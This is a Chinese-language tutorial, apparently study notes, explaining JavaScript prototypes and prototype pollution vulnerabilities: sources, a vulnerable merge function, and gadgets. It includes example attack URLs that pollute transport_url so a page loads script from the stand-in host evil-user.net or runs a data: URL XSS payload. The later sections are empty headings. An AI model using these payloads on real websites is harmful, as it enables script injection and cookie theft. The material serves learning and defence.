# 原型链污染
> xxx
## JavaScript中的原型和继承
### 什么是 JavaScript 对象？
JavaScript 对象本质上只是键值对（称为"属性"）的集合
```js
const user = {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```
可以使用点表示法或方括号表示法来访问对象的属性，引用它们各自的键：
```js
user.username     // "wiener"
user['userId']    // 01234
```
除了数据，属性还可以包含可执行的函数。在这种情况下，该函数被称为"方法"：
```js
const user = {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}
```
上面的例子是一个"对象字面量"，这意味着它是使用花括号语法创建的，显式声明了其属性和初始值。重要的是要理解，在底层，JavaScript 中的几乎所有东西都是对象。在这些材料中，术语"对象"指的是所有实体，而不仅仅是对象字面量。
### 什么是 JavaScript 原型？
JavaScript 中的每个对象都链接到某种类型的另一个对象，这被称为其原型。默认情况下，JavaScript 会自动为新对象分配其内置原型之一。例如，字符串被自动分配内置的 String.prototype
```js
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);     // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```
对象自动继承其分配的原型的所有未被重写的属性
### JavaScript 中的对象继承是如何工作的？
每当引用对象的属性时，JavaScript 引擎首先尝试直接在对象本身上访问它。如果对象没有匹配的属性，JavaScript 引擎则会转而查找其原型。例如：
```
myObject ──prototype──> AnotherObject ──prototype──> Object.prototype ──prototype──> null
propertyA 不存在        propertyA 存在
```
### 原型链
对象的原型只是另一个对象，它也应该有自己的原型，依此类推。由于在底层，JavaScript 中的几乎所有东西都是对象，这个链条最终会回溯到顶层的 Object.prototype，其原型就是 null。
```
username (string) ──prototype──> String.prototype ──prototype──> Object.prototype ──prototype──> null
```
对象不仅从其直接原型继承属性，而且从原型链中它们之上的所有对象继承属性。在上面的例子中，这意味着 username 对象可以访问 String.prototype 和 Object.prototype 两者的属性和方法。
### 使用 __proto__ 访问对象的原型
每个对象都有一个特殊的属性，您可以用它来访问其原型。虽然没有一个正式标准化的名称，但 __proto__ 是大多数浏览器使用的事实标准。
这个属性既充当对象原型的 getter，也充当 setter。这意味着可以用它来读取原型及其属性，甚至在必要时重新分配它们。
与任何属性一样，可以使用方括号表示法或点表示法来访问 __proto__
```js
username.__proto__
username['__proto__']
```
您甚至可以链接 __proto__ 引用，沿着原型链向上追溯
```js
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```
### 修改原型
开发者可以自定义或覆盖内置方法的行为，甚至可以添加新的方法来执行有用的操作。
例如，现代 JavaScript 为字符串提供了 trim() 方法，使您能够轻松移除任何前导和尾随空白。在这个内置方法引入之前，开发者有时会通过执行类似以下操作，将他们自己的自定义实现添加到 String.prototype 对象：
```js
String.prototype.removeWhitespace = function(){
    // 移除前导和尾随空白
}
```
由于原型继承，所有字符串随后都可以访问这个方法：
```js
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```
### 什么是原型污染
原型链污染是一种 JavaScript 漏洞，它允许攻击者向全局对象原型添加任意属性，这些属性随后会被用户定义的对象继承。
通过原型链污染污染配置对象
虽然原型链污染通常不能作为独立漏洞被利用，但它让攻击者能够控制原本无法访问的对象的属性。如果应用程序后续以不安全的方式处理攻击者可控的属性，这可能会与其他漏洞串联利用。在客户端 JavaScript 中，这通常导致 DOM XSS，而服务端原型链污染甚至可能导致远程代码执行。
## 原型链污染漏洞是如何产生的
原型链污染漏洞通常出现在以下情况：当一个 JavaScript 函数递归地将一个包含用户可控属性的对象合并到现有对象中，而没有先对键名进行清理时。这允许攻击者注入一个键名为 __proto__ 的属性，并附带任意嵌套属性。
由于 __proto__ 在 JavaScript 上下文中的特殊含义，合并操作可能会将嵌套属性赋值给对象的原型，而不是目标对象本身。结果，攻击者可以用包含恶意值的属性污染原型，这些值随后可能被应用程序以危险的方式使用。
可以污染任何原型对象，但最常见的是内置的全局 Object.prototype。
成功利用原型链污染需要以下关键组件：
**prototype pollution source** - 任何允许你用任意属性污染原型对象的输入。
**sink** : 换句话说，一个允许任意代码执行的 JavaScript 函数或 DOM 元素。
**exp gadget** - 任何在没有适当过滤或清理的情况下被传递到汇聚点的属性
### source
指任何用户可控的、能够让你向原型对象添加任意属性的输入。最常见的源如下：
1. 通过查询字符串或片段字符串（哈希）的 URL
   示例：通过 URL 的原型链污染
   以下 URL，其中包含攻击者构造的查询字符串
   `https://vulnerable-website.com/?__proto__[evilProperty]=payload` 
   拼接后变为`targetObject.__proto__.evilProperty = 'payload';`
   1. 在 JavaScript 中，__proto__ 是一个访问器属性（accessor property），而不是一个普通的键值对存储位置。当写 targetObject.__proto__ 时，JavaScript 引擎不会去 targetObject 里找一个叫 __proto__ 的普通属性，而是调用这个 getter 函数，返回 targetObject 的原型对象。
   2. 关键点：evilProperty 被添加到了原型对象上，而不是 targetObject 本身
      ```js
        // 步骤1：获取 targetObject 的原型对象
        let prototypeOfTarget = Object.getPrototypeOf(targetObject);  // 通常是 Object.prototype

        // 步骤2：给这个原型对象添加属性
        prototypeOfTarget.evilProperty = 'payload';
      ``` 
    3. 因为 Object.prototype 是所有普通对象的顶层原型（原型链的顶端），一旦你在这个对象上添加了一个属性，所有继承自 Object.prototype 的对象都会看到这个属性
       ```js
        // 假设 targetObject 是一个普通对象
        let targetObject = { a: 1, b: 2 };
        // targetObject 的原型是 Object.prototype

        // 执行污染
        targetObject.__proto__.evilProperty = 'payload';

        // 验证
        Object.prototype.evilProperty;  // 'payload' —— 原型被污染了！

        // 创建一个新对象
        let newObj = { x: 10 };
        newObj.evilProperty;  // 'payload' —— 新对象也继承了！
       ``` 
    4. **攻击者需要知道应用程序实际会读取什么属性，然后污染那个属性。**
    5. 攻击流程
       ```
        攻击者注入 __proto__.transport_url = 'https://evil.com'
        污染了 Object.prototype.transport_url
        应用程序读取 config.transport_url 时，config 自己没这个属性
        JavaScript 引擎沿原型链向上找，在 Object.prototype 上找到了
        攻击者控制了脚本加载的 URL → XSS 或供应链攻击
       ``` 
2. 基于 JSON 的输入
   1. 核心差异：对象字面量 vs JSON.parse()
      1. 对象字面量：__proto__ 是特殊语法当你使用花括号 {} 直接创建对象时，__proto__ 被 JavaScript 引擎识别为特殊键名，不会被当作普通属性存储。
        ```js
        const objectLiteral = {__proto__: {evilProperty: 'payload'}};

        // 检查 objectLiteral 自身是否有 '__proto__' 这个键
        objectLiteral.hasOwnProperty('__proto__');     // false ❌

        // '__proto__' 触发了原型设置，而不是创建普通属性
        // 等价于：objectLiteral.__proto__ = {evilProperty: 'payload'}
        // 也就是说，objectLiteral 的原型被直接设置成了 {evilProperty: 'payload'}
        ```
      2. JSON.parse()：__proto__ 是普通字符串.用 JSON.parse() 解析 JSON 字符串时，__proto__ 没有任何特殊含义，它就是一个普通的字符串键。
        ```js
        const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

        // 检查 objectFromJson 自身是否有 '__proto__' 这个键
        objectFromJson.hasOwnProperty('__proto__');     // true ✅

        // '__proto__' 就是一个普通的属性名，不是原型设置器
        objectFromJson.__proto__;           // {evilProperty: 'payload'} —— 这是一个普通属性！
        Object.getPrototypeOf(objectFromJson);  // Object.prototype —— 原型没有被改变！        
        ```
   2. 为什么这个差异会导致原型链污染？
      1. 攻击场景：合并操作 
        很多 JavaScript 库和框架会执行对象合并操作，比如：
        ```js
        // 类似 jQuery.extend() 或 lodash.merge() 的行为
        function merge(target, source) {
            for (let key in source) {
                if (typeof source[key] === 'object' && source[key] !== null) {
                    // 递归合并
                    if (!target[key]) target[key] = {};
                    merge(target[key], source[key]);
                } else {
                    target[key] = source[key];
                }
            }
            return target;
        }
        ```
        漏洞触发过程
        ```js
        // 1. 攻击者提供的 JSON 输入
        const attackerJson = '{"__proto__": {"evilProperty": "payload"}}';
        const attackerObject = JSON.parse(attackerJson);

        // 2. 应用程序将攻击者输入合并到配置对象中
        let config = { theme: 'dark' };
        merge(config, attackerObject);

        // 3. 在 merge 函数内部发生了什么？
        // 遍历 attackerObject 的键 → key = '__proto__'
        // 由于 '__proto__' 是一个普通属性（在 attackerObject 上存在）
        // 执行：config['__proto__'] = attackerObject['__proto__']
        // 即：config.__proto__ = {evilProperty: 'payload'}

        // 4. config.__proto__ 是访问器属性！
        // 给 config.__proto__ 赋值 = 设置 config 的原型
        Object.setPrototypeOf(config, {evilProperty: 'payload'});

        // 5. 或者如果 merge 函数递归进入 '__proto__'：
        // merge(config['__proto__'], {evilProperty: 'payload'})
        // config['__proto__'] 等价于 Object.prototype
        // 所以执行：Object.prototype.evilProperty = 'payload'

        // 结果：原型被污染！
        Object.prototype.evilProperty;  // 'payload'
        ```
      2. 总结：对象字面量的 __proto__ 是原型设置器，JSON.parse() 的 __proto__ 是普通钥匙。但两者在合并时都可能成为原型污染的武器。
3. Web 消息
### sink 
由于原型链污染让你能够控制原本无法访问的属性，这潜在使你能够访问目标应用程序中的许多额外汇聚点。不熟悉原型链污染的开发者可能会错误地认为这些属性不是用户可控的，这意味着可能只有最小的过滤或清理措施。
### gadget
1. 一个 Gadget 需要同时满足三个条件：
程序会使用它：应用程序的代码会读取某个属性（例如 transport_url），并以不安全的方式使用它（如拼接到 <script src> 中）。
攻击者可控制它：正常情况下，开发者可能没有显式设置这个属性，导致程序会沿着原型链向上查找。
对象自身没有定义：目标对象（如 config）自身没有定义这个属性。这样，它才会去原型链上查找，从而继承攻击者污染后的恶意值。
例如：
    ```js
    // 1. 程序尝试读取 config.transport_url
    let transport_url = config.transport_url || defaults.transport_url;

    // 2. 程序不安全地使用了这个值
    let script = document.createElement('script');
    script.src = `${transport_url}/example.js`; // 拼接到脚本地址中
    document.body.appendChild(script);
    ```
2. 攻击链拆解：如何利用 Gadget
攻击者需要完成以下步骤，将 Gadget 变为实际的攻击：
找到污染源（Source）：找到一个能向 Object.prototype 添加属性的入口。例如，URL 中的 __proto__ 参数。
找到可利用的 Gadget：发现程序会读取 config.transport_url 这个属性。
实施污染（Pollution）：构造恶意链接，通过污染源在 Object.prototype 上添加一个恶意的 transport_url 属性。
3. 攻击示例
   1. 示例一：使用远程域名
   https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
   **意图**：让 transport_url 的值为 //evil-user.net。
   **结果**：最终加载的脚本 URL 变成 //evil-user.net/example.js。浏览器会从攻击者的服务器 evil-user.net 上加载 JavaScript 文件，攻击者可以在此文件中编写任意恶意代码（如窃取 Cookie、键盘记录等），实现供应链或 XSS 攻击。
   2. 示例二：使用 data: URL（直接 XSS 攻击）
   https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
   **意图**：利用 data: 协议直接嵌入代码。
   语法拆解：
   data:,alert(1); 是一个 data: URL，其内容就是 JavaScript 代码 alert(1);。
   // 是 JavaScript 的单行注释。它的作用是注释掉原本硬编码在程序里的 /example.js 后缀。
   结果：最终脚本的 URL 实际上变成了 data:,alert(1);//example.js。浏览器会将其解析为一个 data: URL，并直接执行其中的 alert(1) 代码，实现了DOM XSS。
4. URL 中的 __proto__[transport_url]=//evil-user.net 本身就是原型链污染操作。污染成功后，程序后续读取 transport_url 属性时拿到了恶意值，这才导致了 XSS 或供应链攻击。污染是因，XSS 是果。
如果网站不存在原型链污染漏洞（例如：过滤了 __proto__、使用了 Object.freeze(Object.prototype)、或使用 Map 代替普通对象），那么即使 URL 中包含 __proto__ 参数，也不会产生任何效果
## 客户端原型污染
### 发现客户端source
### 发现客户端gadget
### 使用 DOM Invader 发现客户端原型链污染构件
### 通过 constructor 进行原型链污染
## 服务端原型污染
## 如何防止漏洞